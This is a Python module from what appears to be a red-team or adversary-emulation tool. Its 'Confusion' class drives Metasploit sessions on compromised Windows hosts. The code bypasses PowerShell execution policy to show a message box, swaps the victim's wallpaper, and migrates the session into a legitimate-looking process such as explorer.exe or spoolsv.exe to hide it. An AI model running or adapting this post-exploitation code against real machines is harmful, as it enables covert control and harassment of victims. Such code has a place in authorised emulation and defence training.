#!/usr/bin/env python3
import os
import time
import random
from lib.Reconnaissance.reconnaissance import Reconnaissance
from data.event import Event, EventUtils
class Confusion():

    def openAlertBox(self, msfclient, sessionInput):
        EventUtils.settingEvent(self, "Sending alertbox to session " + sessionInput + ".")
        msfclient.client.sessions.session('1').run_shell_cmd_with_output('@powershell.exe -ExecutionPolicy Bypass -Command \"[System.Reflection.Assembly]::LoadWithPartialName(\'System.Windows.Forms\'); [System.Windows.Forms.MessageBox]::Show(\'We are proceeding with next step.\')\"', end_strs=None)
    
    def changeWallpaper(self, msfclient, sessionInput):
        EventUtils.settingEvent(self, "Changing wallpapper on session " + sessionInput + ".")
        path = os.path.dirname(__file__)
        cw = msfclient.client.modules.use('post', 'multi/manage/set_wallpaper')
        cw['SESSION'] = int(sessionInput)
        cw['WALLPAPER_FILE'] = path + '/magicword.jpg'
        cw.execute()
        time.sleep(5)

    def moveIntoProcess(self, msfclient, sessionInput):
        EventUtils.settingEvent(self, "Moving into a different process on " + sessionInput + ".")
        good_process = ['OneDrive.exe', 'spoolsv.exe', 'explorer.exe']
        pid = []
        list_pid = Reconnaissance.gatherPID(self, msfclient, sessionInput)
        for p in list_pid:
            if p['Name'] in good_process:
                    pid.append(p['PID'])
        chosen_pid = random.choice(pid)
        print(f"Chosen {chosen_pid} to migrate into")
        e = msfclient.client.sessions.session(sessionInput).run_with_output(f'migrate {chosen_pid}')
        time.sleep(10)